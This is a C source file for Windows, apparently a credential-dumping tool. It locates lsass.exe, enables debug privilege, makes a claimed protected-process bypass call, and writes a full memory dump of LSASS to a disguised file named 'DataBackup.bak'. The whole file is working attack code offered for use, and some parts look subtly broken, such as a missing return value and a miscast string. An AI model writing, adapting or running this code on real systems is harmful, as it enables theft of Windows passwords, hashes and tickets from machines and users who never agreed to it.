﻿#include <windows.h>
#include <tchar.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include "lsassdmp.h"
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")


DWORD getPID() {
	
	DWORD dwLsassPID = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	BOOL bFind = Process32First(hSnap, &pe);
	while (bFind)
	{
		if (_tcscmp(pe.szExeFile, _T("lsass.exe")) == 0)
		{
			dwLsassPID = pe.th32ProcessID;
			break;
		}
		bFind = Process32Next(hSnap, &pe);
	}
	CloseHandle(hSnap);
	return dwLsassPID;
}
BOOL EnableDebugPriv() {

	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;
	BOOL bFlag;

	bFlag = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
	if (!bFlag)
	{
		printf("[-]OpenProcessToken failed");
		return FALSE;
	}

	bFlag = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &TokenPrivileges.Privileges[0].Luid);
	if (!bFlag)
	{
		printf("[-]LookupPrivilegeValue failed");
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	bFlag = AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (!bFlag)
	{
		printf("[-]AdjustTokenPrivileges failed");
		return FALSE;
	}
}

int main()
{
	//variables for NtOpenProcess()
	HANDLE hLsass = NULL;
	OBJECT_ATTRIBUTES objAttr = { 0 };
	UNICODE_STRING processName;
	CLIENT_ID clientId;

	WCHAR* processNameString = (WCHAR*)"lsass.exe";
	processName.Buffer = processNameString;
	processName.Length = wcslen(processNameString) * sizeof(WCHAR);
	processName.MaximumLength = processName.Length + sizeof(WCHAR);
	clientId.UniqueProcess = (HANDLE)getPID();
	clientId.UniqueThread = NULL;

	// Enable SeDebugPrivilege
	if (!EnableDebugPriv()) {
		printf("[-]EnableDebugPriv failed");
		return 0;
	}

	// bypass PPL 
	DefineDosDevice(DDD_RAW_TARGET_PATH, L"LSASS", L"\\Device\\LSASS");

	// obatain handle from lsass.exe via NtOpenProcess()
	NTSTATUS status = NtOpenProcess(&hLsass, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &objAttr, &clientId);

	if (status != STATUS_SUCCESS)
	{
		printf("[-]NtOpenProcess failed.");
		return 0;
	}

	// Gets the handle file name of the LSASS process
	TCHAR szFileName[MAX_PATH];
	DWORD dwSize = MAX_PATH;
	QueryFullProcessImageName(hLsass, 0, szFileName, &dwSize);

	// Open the LSASS process handle
	HANDLE hLsassFile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	// Export Lsass process memory
	_stprintf_s(szFileName, MAX_PATH, _T("DataBackup.bak"));

	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	//Dump lsass.exe using MiniDumpWriteDump()
	BOOL bRes = MiniDumpWriteDump(hLsass, GetProcessId(hLsass), hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	CloseHandle(hFile);
	CloseHandle(hLsassFile);
	CloseHandle(hLsass);

	if (!bRes)
	{
		printf("[-]MiniDumpWD failed.");
		return 0;
	}
	printf("[+]Enjoy the DataBackup.bak :)");
	return 0;
}